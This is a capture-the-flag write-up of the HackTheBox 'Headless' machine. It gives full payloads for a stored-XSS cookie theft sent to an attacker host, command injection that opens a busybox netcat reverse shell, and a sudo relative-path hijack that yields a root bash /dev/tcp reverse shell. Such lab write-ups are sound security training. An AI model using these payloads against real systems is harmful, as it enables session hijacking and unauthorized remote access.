## Hello everyone!

Today, we will cove “Headless”, an easy-difficulty Linux machine from **HackTheBox**.

Without further ado, let’s get started!



![image](/HTB/Headless/Headless_images/1.png)



(Ensure that you added the following line  `TARGET_IP     headless.htb`  to your local `/etc/hosts` file)

## Information Gathering

First, we will perform an aggressive **Nmap** scan to obtain comprehensive results:



![image](/HTB/Headless/Headless_images/2.png)



We identified two open ports:

**22** - **SSH** (OpenSSH 0.2p1)

**5000** - **HTTP** (Werkzeug 2.2.2)

We can start by inspecting the **HTTP** website hosted on port **5000**:



![image](/HTB/Headless/Headless_images/3.png)



It looks like we face a website under construction. We can access a `/support` folder by clicking the “*For questions”* button:



![image](/HTB/Headless/Headless_images/4.png)



Since this is a formular, we can attempt to perform a XSS (Cross-Site-Scripting) Attack by injecting JavaScript payload that may be stored on the web server. We can try to use a simple alert payload:

`<script>alert(”Hello”)</script>`



![image](/HTB/Headless/Headless_images/5.png)



We can then hit *Submit*:



![image](/HTB/Headless/Headless_images/6.png)



It seems that the web server detected our payload. This behavior display an interesting HTTP header: `Cookie` which contains an `is_admin` cookie value with a strings attached to it. Maybe we could be able to leverage it if we need to access a restricted folder. 

We can use Gobuster to perform web directory enumeration:



![image](/HTB/Headless/Headless_images/7.png)



We can identify a `/dashboard` directory which seems to be protected. We can still try to access it:



![image](/HTB/Headless/Headless_images/8.png)



Of course, we can’t.

## Session Hijacking

 We probably need to have a cookie value corresponding to the admin user. Since the machine makes a focus on XSS, i tried various way. And indeed, we can fetch the `is_admin` **cookie value** for the admin by sending the following payload to `/support` via **Burp Suite**:

`<script>var i=new Image(); i.src="http://YOUR_IP:PORT/?cookie="+btoa(document.cookie);</script>`

Before sending it, we will need to open a Python server using `python3 -m http.server PORT`.

We can then paste the payload into the User-Agent header AND in the message= parameter (otherwise it will not work):



![image](/HTB/Headless/Headless_images/9.png)



We can then hit *Send*. Now the payload has been executed, we will check our python server:



![image](/HTB/Headless/Headless_images/10.png)



It looks like we received a cookie value! Since the information relative to our malicious request are sended to the administrator for investigation, when he accessed our payload, he sent us his cookie value encoded in Base64:

`GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=`

We will decode it to see whether we can leverage it to access the restricted dashboard:



![image](/HTB/Headless/Headless_images/11.png)



We successfully obtained the admin’s `is_admin` cookie value.

We can now access the dashboard again and paste the `is_admin` cookie value (`ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`) via the browser **Developer Tools** by right-clicking and selecting “*Inspect*”.



![image](/HTB/Headless/Headless_images/12.png)

![image](/HTB/Headless/Headless_images/13.png)



After we paste the cookie, we can reload the page:



![image](/HTB/Headless/Headless_images/14.png)



We exploited a stored XSS vulnerability in the /support endpoint to exfiltrate the administrator’s session cookie, which we then used to impersonate the admin user, allowing us to access the dashboard.

## Initial Access

It looks like we can interact with a *Generate Report* button. Let’s intercept the request it does through **Burp Suite Proxy**:



![image](/HTB/Headless/Headless_images/15.png)



The POST request to /dashboard contains a parameter named `date`. We can passe it to **Repeater** in order to manipulate the request:

I decided to test the parameter’s behavior by setting up a python server via python3 -m http.server 8000 and attempting to reach it via curl to see whether the parameter can allow us to achieve remote code execution. After few tries, it seems that the application can execute system commands when we input a semicolon before, as demonstrated bellow



![image](/HTB/Headless/Headless_images/16.png)

![image](/HTB/Headless/Headless_images/17.png)



We found a command injection vulnerability in the `date` parameter.

We can set up a **netcat listener** with `netcat -lvnp PORT` and using the following command in **Burp Suite**:

`busybox nc YOUR_IP NETCAT_PORT -e sh`



![image](/HTB/Headless/Headless_images/18.png)



The request should hang. We successfully obtained initial access as **dvir**! We can now stabilize our received shell with the following commands:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

We can now start by checking the `/etc/passwd` file to see whether there are other users on the system:



![image](/HTB/Headless/Headless_images/19.png)



It looks like we gained access as the only existing standard user on the system, which means that we don’t need to perform horizontal privilege escalation to obtain the first flag. We can retrieve it in our `/home/dvir` directory:



![image](/HTB/Headless/Headless_images/20.png)




## Privilege Escalation


We now need to find a way to elevate our privileges in order to retrieve the last flag. We can start a basic local enumeration by running `sudo -l` so check whether we can run any command with elevated privileges:



![image](/HTB/Headless/Headless_images/21.png)



We can run the `syscheck` command with **root** privileges without providing a password.

We can use `man /usr/bin/syscheck` to obtain additional information about the binary:



![image](/HTB/Headless/Headless_images/22.png)



It seems that `syscheck` is a script which handle some checking. We can identify a `initdb.sh` Bash script that is called through the usage of the `syscheck` script. But if we try to search for it, it doesn’t exist on the machine:



![image](/HTB/Headless/Headless_images/23.png)



Since the script is called through a command executed with **root privileges** via `sudo`, we can trick it to obtain a **root shell.**

First, we need to confirm that we can execute elevated commands through the `initdb.sh` invoked script. 

We're going to create a basic script that displays the user running it. If the script is called correctly, we might see  “`root`” in the output because the script will be invoked by a command running as root.

The script will contains the following code:

`#!/bin/bash`

`whoami`

We will give it execute permission using `chmod +x initdb.sh`:



![image](/HTB/Headless/Headless_images/24.png)



We can now attempt to run `sudo syscheck` to see whether the script is triggered:



![image](/HTB/Headless/Headless_images/25.png)



As we can see, the script has been successfully executed! We can try remplace the `whoami` commande with `id` to confirm it:



![image](/HTB/Headless/Headless_images/26.png)



Since we can manipulate the called script in order to execute elevated commands, we can write a payload that will initiate a reverse shell to a listener we control.

We can modify the script and input the following code:

`#!/bin/bash`

`bash -i >& /dev/tcp/YOUR_IP/NC_PORT 0>&1`


![image](/HTB/Headless/Headless_images/27.png)



We will now set up a **netcat listener** which will listen to the port specified in the payload (for my case i chose **4444** so i will execute ****`nc -lvnp 4444`)

After that, we can run `sudo syscheck` to trigger the script and obtain a reverse shell as **root**:



![image](/HTB/Headless/Headless_images/28.png)



The `syscheck` script should hang, resulting to a reverse shell initiated to our local machine! We successfully elevated our privileges to **root**.

We can now navigate to the `/root` directory and retrieve the last flag:



![image](/HTB/Headless/Headless_images/29.png)



Challenge completed!



![image](/HTB/Headless/Headless_images/30.png)




## Conclusion

This machine was very pleasant to complete. We firstly exploited a **XSS vulnerability** which led us to a **session hijacking**, allowing us to access a dashboard reserved to the admin by impersonating his cookie’s session. We achieved remote code execution through a command injection vulnerability in a POST parameter. Finally, we abused a sudo misconfiguration where a script executed via `syscheck` called a non-absolute script (`initdb.sh`), allowing us to hijack execution and gain a root shell.

**Thank you for reading!**
